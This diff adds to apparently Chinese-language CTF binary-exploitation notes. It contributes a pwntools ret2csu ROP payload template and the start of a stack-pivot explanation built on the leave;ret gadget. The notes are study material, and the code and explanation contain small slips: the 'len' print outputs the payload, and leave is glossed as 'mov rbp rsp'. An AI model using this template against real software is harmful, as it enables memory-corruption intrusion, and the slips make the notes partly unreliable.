@@ -235,5 +235,45 @@ def ret2libc_pwntools():
     io.send(rop.chain())
 ```
 
+#### 2.4 ret2csu
 
+**使用**：这是一个万能的gadget，主要针对amd64架构的程序，一般是程序中找不到`pop rdx  ; ret`的gadget，泄露函数是`write`，写入的函数是`read`，反正是需要传入三个参数。还有一个前提，栈溢出至少需要128个字节，或者更多。
+
+**攻击模板**
+
+```python
+def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
+            r12, r13, r14, r15, rbx=0, rbp=1):
+    """
+    return2csu
+    一般程序找不到pop rdx的gadget，需要利用write或者read函数。
+    这里需要找好r13 r14 r15和rdi rsi rdx之间的对应关系，还要分清是rdi还是edi
+    如果是edi，只能控制低4个字节的内容
+    此处示例为r13---rdx r14---rsi r15---edi
+    """
+    io = process('')
+    cur_elf = ELF('')
+    
+    # ret2csu
+    payload = b'a' * 0x0 # 前面的填充
+    payload += p64(csu_end_addr) # 这个地址一般对应的指令为pop rbx
+    payload += p64(rbx) # 0 为了能直接call r12 ptr 
+    payload += p64(rbp) # 1 绕过cmp指令
+    payload += p64(r12) # 填func@got，调用r12存储的地址处的函数，注意这里指令是call ptr
+    payload += p64(r13) # 对应的是rdx
+    payload += p64(r14) # 对应的是rsi
+    payload += p64(r15) # 对应的edi
+    payload += p64(csu_start_addr) # 这里对应的指令一般是mov rdx r13
+    payload += 0x38 * b'a' # 栈会被抬高0x38个字节，这里也可以布局rbp的值，用于后续栈迁移等
+    payload += p64(ret_addr) # 调用完csu链后返回的地址，比如main函数地址
+    
+    print("len of payload:{}".format(payload))
+    io.send(payload)
+```
+
+#### 2.5 stack pivot attack
+
+**使用**：栈迁移攻击的题目很有特点，需要滿足两个条件：1）可泄露地址或者程序不开启PIE；2）栈溢出超过ebp指针的字节为2个指针大小，刚好只能覆盖到函数返回地址。在32位系统下，溢出ebp指针后8个字节，64位系统下，溢出rbp指针后16个字节。例如在64位系统下，栈变量buffer距离rbp为0x30字节大小，程序可以往buffer最多写入0x40个字节。
+
+**原理**：栈溢出的原理并不复杂，核心是利用`leave;ret`这一个gadget。在64为系统下，该gadget的含义其实包括两条指令：`mov rbp rsp, pop rbp;pop rip`。将`rsp`移动到`rbp`指向的位置，然后`pop rbp`，将栈顶指针指向的内容存入到`rbp`寄存器，然后`rsp `往高地址移动8个字节，再执行`pop rip`，将此时栈顶指针的内容赋给`rip`寄存器，开始执行程序流。
 
